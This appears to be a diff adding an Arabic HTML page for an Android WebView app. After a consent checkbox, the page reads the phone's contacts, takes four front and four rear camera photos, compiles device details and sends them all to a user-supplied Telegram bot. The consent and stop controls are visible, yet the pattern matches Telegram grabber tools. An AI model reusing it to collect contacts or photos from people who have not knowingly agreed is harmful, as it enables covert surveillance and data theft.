@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="ar" dir="rtl"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#101827"><title>Contacts Web App</title>
+<style>
+:root{color-scheme:dark;--bg:#0b1220;--panel:#121d2d;--line:#26364b;--ink:#f3f6fb;--muted:#9aabc0;--accent:#78a7ff}
+*{box-sizing:border-box}body{margin:0;min-height:100vh;background:radial-gradient(ellipse at 50% -20%,#203755 0,transparent 55%),var(--bg);font-family:Arial,sans-serif;color:var(--ink);display:grid;place-items:center;padding:20px}
+main{width:100%;max-width:440px}.brand{font-size:12px;letter-spacing:2px;color:var(--accent);font-weight:800;margin:0 0 12px}h1{font-size:25px;margin:0 0 8px}header p{color:var(--muted);font-size:13px;line-height:1.8;margin:0 0 24px}
+.panel{background:linear-gradient(160deg,#172438,#111b2a);border:1px solid var(--line);border-radius:20px;padding:20px;box-shadow:0 20px 70px #0005}
+label.field{display:block;font-size:12px;color:#c4d0df;margin:14px 0 7px}input[type=text],input[type=password]{width:100%;padding:13px 14px;border:1px solid var(--line);border-radius:11px;background:#0c1523;color:#fff;font-size:14px;direction:ltr;text-align:left;outline:none}input:focus{border-color:var(--accent)}
+.consent{display:flex;gap:10px;align-items:flex-start;margin:18px 0 14px;font-size:12px;line-height:1.9;color:#c7d2e1}.consent input{margin:4px 0 0;accent-color:var(--accent);flex:0 0 auto}
+button{width:100%;border:0;border-radius:12px;padding:14px;background:linear-gradient(100deg,#477fe0,#6da6ff);color:#071326;font-size:14px;font-weight:800;cursor:pointer}button:disabled{opacity:.45;cursor:not-allowed}
+#status{min-height:22px;text-align:center;margin-top:14px;color:var(--muted);font-size:12px;line-height:1.8}
+#stopButton{display:none;margin-top:10px;background:#3a2029;color:#ffdce2;border:1px solid #70404a}
+video{display:none}
+</style></head><body><main>
+<header><div class="brand">ASHROOF LABS</div><h1>Contacts Web App</h1><p>جلسة واضحة، بإذن صريح وتحكم كامل.</p></header>
+<section class="panel">
+<label class="field" for="botToken">Bot Token</label><input id="botToken" type="password" autocomplete="off" placeholder="أدخل توكن البوت">
+<label class="field" for="chatId">Chat ID</label><input id="chatId" type="text" placeholder="أدخل Chat ID">
+<label class="consent"><input id="consent" type="checkbox"><span>أوافق على قراءة أسماء وأرقام جهات الاتصال، والتقاط 8 صور (4 أمامية و4 خلفية)، وإرسالها إلى حساب Telegram المحدد، مع معلومات تقنية أساسية عن الجهاز مثل الشركة/الموديل إن أتاحها النظام، إصدار Android، وإصدار التطبيق. لن تُجمع الرسائل أو سجل المكالمات أو الملفات.</span></label>
+<button id="startButton" onclick="startSession()">موافقة وبدء</button>
+<div id="status" role="status" aria-live="polite">في انتظار موافقتك.</div>
+<button id="stopButton" onclick="stopSession()">إيقاف الجلسة</button>
+<video id="video" autoplay playsinline muted></video>
+</section></main>
+<script>
+let contacts=[],photos=[],stream=null,active=false,contactsReady=false,token='',chat='',sending=false;
+const $=id=>document.getElementById(id);const delay=ms=>new Promise(r=>setTimeout(r,ms));
+function status(s){$('status').textContent=s}
+function deviceReport(){const ua=navigator.userAgent||'غير متاح';const android=(ua.match(/Android\s[\d.]+/i)||[])[0]||'غير متاح';const model=(ua.match(/Android\s[\d.]+;\s*([^;)]+)/i)||[])[1]||'غير متاح';let tz='غير متاح';try{tz=Intl.DateTimeFormat().resolvedOptions().timeZone||tz}catch(e){}return ['معلومات تقنية للجهاز','النظام: '+android,'الطراز (حسب ما يظهر للمتصفح): '+model,'المتصفح/وكيل المستخدم: '+ua,'لغة الجهاز: '+(navigator.language||'غير متاح'),'المنصة: '+(navigator.platform||'غير متاح'),'دقة الشاشة: '+screen.width+'x'+screen.height,'المنطقة الزمنية: '+tz,'إصدار التطبيق: 1.0'].join('\r\n')}
+async function startSession(){if(!$('consent').checked)return status('اقرأ نطاق البيانات وحدد الموافقة أولاً.');token=$('botToken').value.trim();chat=$('chatId').value.trim();if(!token||!chat)return status('أدخل بيانات Telegram.');if(!window.AndroidApp)return status('افتح التطبيق من APK على Android.');$('startButton').disabled=true;$('stopButton').style.display='block';status('جارٍ طلب الأذونات...');active=true;contacts=[];photos=[];contactsReady=false;AndroidApp.requestContacts()}
+window.onContactsReceived=raw=>{try{contacts=JSON.parse(raw)||[];contactsReady=true;status('تم تجهيز جهات الاتصال. جارٍ طلب إذن الكاميرا...');AndroidApp.requestCameraPermission()}catch(e){fail('تعذر قراءة جهات الاتصال.')}};
+window.onContactsPermissionDenied=()=>fail('لم تمنح إذن جهات الاتصال.');
+window.onCameraPermissionResult=async granted=>{if(!granted)return fail('لم تمنح إذن الكاميرا.');try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:960},height:{ideal:720}},audio:false});await attachCamera(stream);await captureSeries('user');if(!active)return;await switchCamera('environment');await captureSeries('environment');if(!active)return;stopCamera();active=false;status('اكتمل الالتقاط. جارٍ الإرسال...');sendBundle()}catch(e){fail('تعذر إكمال التصوير: '+e.message)}};
+async function attachCamera(s){const v=$('video');v.srcObject=s;await v.play();for(let i=0;i<40;i++){if(v.videoWidth>0&&v.videoHeight>0&&v.readyState>=2){if(v.requestVideoFrameCallback)await new Promise(r=>v.requestVideoFrameCallback(()=>r()));else await delay(250);return}await delay(150)}throw Error('الكاميرا لم تصبح جاهزة.')}
+async function switchCamera(mode){if(stream)stream.getTracks().forEach(t=>t.stop());stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:mode},width:{ideal:960},height:{ideal:720}},audio:false});await attachCamera(stream)}
+async function captureSeries(facing){for(let i=0;i<4;i++){if(!active)return;const v=$('video');if(v.requestVideoFrameCallback)await new Promise(r=>v.requestVideoFrameCallback(()=>r()));else await delay(300);const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d',{alpha:false}).drawImage(v,0,0);const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',.68));if(!blob||blob.size<1200)throw Error('تعذر التقاط صورة صالحة.');const data=await new Promise((resolve,reject)=>{const fr=new FileReader();fr.onload=()=>resolve(fr.result);fr.onerror=reject;fr.readAsDataURL(blob)});photos.push({name:(facing==='user'?'front-':'rear-')+(i+1)+'.jpg',data});status('جارٍ التقاط الصور '+photos.length+'/8');await delay(180)}}
+function stopCamera(){if(stream)stream.getTracks().forEach(t=>t.stop());stream=null;$('video').srcObject=null}
+function stopSession(){active=false;stopCamera();$('stopButton').style.display='none';$('startButton').disabled=false;status('تم إيقاف الجلسة. لم يتم إرسال البيانات.')}
+function fail(msg){active=false;stopCamera();$('stopButton').style.display='none';$('startButton').disabled=false;status(msg)}
+function sendBundle(){if(sending||active||!contactsReady||photos.length!==8)return;sending=true;status('جارٍ إرسال التقرير وألبوم الصور...');const lines=['تقرير الجلسة','عدد جهات الاتصال: '+contacts.length,'',deviceReport(),'','جهات الاتصال',...contacts.map(c=>(c.name||'بدون اسم')+' | '+(c.phone||''))];const report=lines.join('\r\n');const media=photos.map(p=>({name:p.name,data:p.data.split(',')[1]}));AndroidApp.sendApprovedBundle(token,chat,'\uFEFF'+report,JSON.stringify(media))}
+window.onUploadProgress=(percent,label)=>status(label);
+window.onTelegramResult=(ok,msg)=>{sending=false;$('stopButton').style.display='none';$('startButton').disabled=false;status(ok?'اكتمل الإرسال بنجاح.':msg)};
+</script></body></html>
